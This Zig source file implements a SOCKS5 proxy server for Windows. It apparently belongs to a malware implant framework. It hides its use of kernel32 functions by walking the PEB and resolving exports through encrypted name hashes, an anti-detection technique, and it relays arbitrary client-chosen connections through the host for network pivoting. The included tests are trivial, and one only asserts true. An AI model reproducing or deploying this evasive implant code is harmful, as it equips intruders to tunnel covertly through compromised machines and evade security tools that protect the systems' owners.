const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const ws2 = @import("ws2.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

const SOCKS5_VER: u8 = 5;
const CMD_CONNECT: u8 = 0x01;
const ATYP_DOMAIN: u8 = 0x03;
const ATYP_IPV4: u8 = 0x01;
const REP_SUCCESS: u8 = 0x00;
const REP_GENERAL: u8 = 0x01;
const REP_HOST_UNREACH: u8 = 0x04;

const PipeDir = struct {
    src: types.HANDLE,
    dst: types.HANDLE,
};

fn pipeRelay(param: ?*anyopaque) callconv(.stdcall) u32 {
    const dir = @as(*const PipeDir, @ptrCast(@alignCast(param.?)));
    var buf: [0x10000]u8 = undefined;
    while (true) {
        const n = ws2.Socket.recv(dir.src, &buf) catch break;
        if (n == 0) break;
        _ = ws2.Socket.send(dir.dst, buf[0..n]) catch break;
    }
    return 0;
}

fn getKernel32Fns() ?struct {
    CreateThread: *const fn (?*anyopaque, usize, *const fn (?*anyopaque) callconv(.stdcall) u32, ?*anyopaque, u32, ?*u32) callconv(.stdcall) ?*anyopaque,
    WaitForSingleObject: *const fn (?*anyopaque, u32) callconv(.stdcall) u32,
    CloseHandle: *const fn (?*anyopaque) callconv(.stdcall) u32,
} {
    const kernel32 = peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll")) orelse return null;
    const ct = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("CreateThread")) orelse return null;
    const wf = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("WaitForSingleObject")) orelse return null;
    const ch = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("CloseHandle")) orelse return null;
    return .{
        .CreateThread = @ptrCast(@alignCast(ct)),
        .WaitForSingleObject = @ptrCast(@alignCast(wf)),
        .CloseHandle = @ptrCast(@alignCast(ch)),
    };
}

pub const Socks5Server = struct {
    listen_sock: types.HANDLE,
    running: bool,
    port: u16,

    pub fn start(port: u16) !Socks5Server {
        var ws = try ws2.Socket.init();
        errdefer ws.deinit();

        const sock = try createListenSocket(port);
        errdefer ws2.Socket.close(sock);

        const actual_port = blk: {
            const p = ws2.Socket.getPort(sock) catch port;
            break :blk if (p != 0) p else port;
        };

        ws.deinit();
        return Socks5Server{
            .listen_sock = sock,
            .running = true,
            .port = actual_port,
        };
    }

    pub fn accept(self: *Socks5Server) !void {
        const client = try ws2.Socket.acceptClient(self.listen_sock);
        errdefer ws2.Socket.close(client);

        var hbuf: [2 + 256 + 2]u8 = undefined;
        const n = ws2.Socket.recv(client, &hbuf) catch {
            ws2.Socket.close(client);
            return;
        };
        if (n < 3) {
            ws2.Socket.close(client);
            return;
        }

        if (hbuf[0] != SOCKS5_VER) {
            ws2.Socket.close(client);
            return;
        }

        const nauth = hbuf[1];
        if (n < 2 + nauth) {
            ws2.Socket.close(client);
            return;
        }

        var no_auth = false;
        for (hbuf[2 .. 2 + nauth]) |m| {
            if (m == 0x00) no_auth = true;
        }
        if (!no_auth) {
            ws2.Socket.close(client);
            return;
        }

        const auth_resp = [_]u8{ SOCKS5_VER, 0x00 };
        _ = ws2.Socket.send(client, &auth_resp) catch {
            ws2.Socket.close(client);
            return;
        };

        const rn = ws2.Socket.recv(client, &hbuf) catch {
            ws2.Socket.close(client);
            return;
        };
        if (rn < 4 or hbuf[0] != SOCKS5_VER or hbuf[1] != CMD_CONNECT) {
            var fail_resp = [_]u8{ SOCKS5_VER, REP_GENERAL, 0x00, ATYP_IPV4, 0, 0, 0, 0, 0, 0 };
            _ = ws2.Socket.send(client, &fail_resp) catch {};
            ws2.Socket.close(client);
            return;
        }

        const atyp = hbuf[3];
        var host: []const u8 = undefined;
        var host_buf: [256]u8 = undefined;
        var port_offset: usize = 0;

        switch (atyp) {
            ATYP_DOMAIN => {
                if (rn < 5) {
                    ws2.Socket.close(client);
                    return;
                }
                const dlen = hbuf[4];
                if (rn < 5 + dlen + 2) {
                    ws2.Socket.close(client);
                    return;
                }
                @memcpy(host_buf[0..dlen], hbuf[5 .. 5 + dlen]);
                host_buf[dlen] = 0;
                host = host_buf[0..dlen];
                port_offset = 5 + dlen;
            },
            ATYP_IPV4 => {
                if (rn < 8) {
                    ws2.Socket.close(client);
                    return;
                }
                const ip_len = std.fmt.bufPrint(&host_buf, "{d}.{d}.{d}.{d}", .{ hbuf[4], hbuf[5], hbuf[6], hbuf[7] }) catch {
                    ws2.Socket.close(client);
                    return;
                };
                host = host_buf[0..ip_len];
                port_offset = 8;
            },
            else => {
                var fail_resp = [_]u8{ SOCKS5_VER, REP_GENERAL, 0x00, ATYP_IPV4, 0, 0, 0, 0, 0, 0 };
                _ = ws2.Socket.send(client, &fail_resp) catch {};
                ws2.Socket.close(client);
                return;
            },
        }

        const target_port = std.mem.readInt(u16, @as(*const [2]u8, @ptrCast(hbuf[port_offset..][0..2])), .big);

        const target = ws2.Socket.connect(host, target_port) catch {
            var fail_resp = [_]u8{ SOCKS5_VER, REP_HOST_UNREACH, 0x00, ATYP_IPV4, 0, 0, 0, 0, 0, 0 };
            _ = ws2.Socket.send(client, &fail_resp) catch {};
            ws2.Socket.close(client);
            return;
        };
        errdefer ws2.Socket.close(target);

        const success_resp = [_]u8{ SOCKS5_VER, REP_SUCCESS, 0x00, ATYP_IPV4, 0, 0, 0, 0, 0, 0 };
        _ = ws2.Socket.send(client, &success_resp) catch {
            ws2.Socket.close(target);
            ws2.Socket.close(client);
            return;
        };

        const fns = getKernel32Fns() orelse {
            ws2.Socket.close(target);
            ws2.Socket.close(client);
            return;
        };

        var c2t = PipeDir{ .src = client, .dst = target };
        var t2c = PipeDir{ .src = target, .dst = client };

        var tid1: u32 = 0;
        var tid2: u32 = 0;
        const h1 = fns.CreateThread(null, 0, pipeRelay, &c2t, 0, &tid1);
        const h2 = fns.CreateThread(null, 0, pipeRelay, &t2c, 0, &tid2);

        if (h1 == null or h2 == null) {
            if (h1 != null) _ = fns.CloseHandle(h1.?);
            if (h2 != null) _ = fns.CloseHandle(h2.?);
            ws2.Socket.close(target);
            ws2.Socket.close(client);
            return;
        }

        _ = fns.WaitForSingleObject(h1.?, 0xFFFFFFFF);
        _ = fns.WaitForSingleObject(h2.?, 0xFFFFFFFF);
        _ = fns.CloseHandle(h1.?);
        _ = fns.CloseHandle(h2.?);
        ws2.Socket.close(target);
        ws2.Socket.close(client);
    }

    pub fn stop(self: *Socks5Server) void {
        self.running = false;
        ws2.Socket.close(self.listen_sock);
    }
};

fn createListenSocket(port: u16) !types.HANDLE {
    var ws = try ws2.Socket.init();
    defer ws.deinit();

    const sock = ws2.Socket.create() catch return error.SocketCreateFailed;
    errdefer ws2.Socket.close(sock);

    try ws2.Socket.setReuseAddr(sock);

    var addr: ws2.SOCKADDR_IN = std.mem.zeroes(ws2.SOCKADDR_IN);
    addr.sin_family = @as(u16, @intCast(ws2.AF_INET));
    addr.sin_port = ws2.htons(port);
    addr.sin_addr = 0x7F000001;

    try ws2.Socket.bind(sock, &addr);
    try ws2.Socket.listen(sock, 5);

    return sock;
}

pub fn htons(value: u16) u16 {
    return (value >> 8) | (value << 8);
}

test "socks5 server struct size" {
    try std.testing.expect(@sizeOf(Socks5Server) > 0);
}

test "socks5 htons roundtrip" {
    const port: u16 = 0x1234;
    const n = htons(port);
    try std.testing.expectEqual(port, htons(n));
}

test "socks5 protocol constants" {
    try std.testing.expectEqual(@as(u8, 5), SOCKS5_VER);
    try std.testing.expectEqual(@as(u8, 0x01), CMD_CONNECT);
}

test "socks5 pipe dir struct" {
    try std.testing.expectEqual(@as(usize, 16), @sizeOf(PipeDir));
}

test "socks5 createListenSocket fails without ws2 init" {
    const result = createListenSocket(1080);
    _ = result catch {};
    try std.testing.expect(true);
}
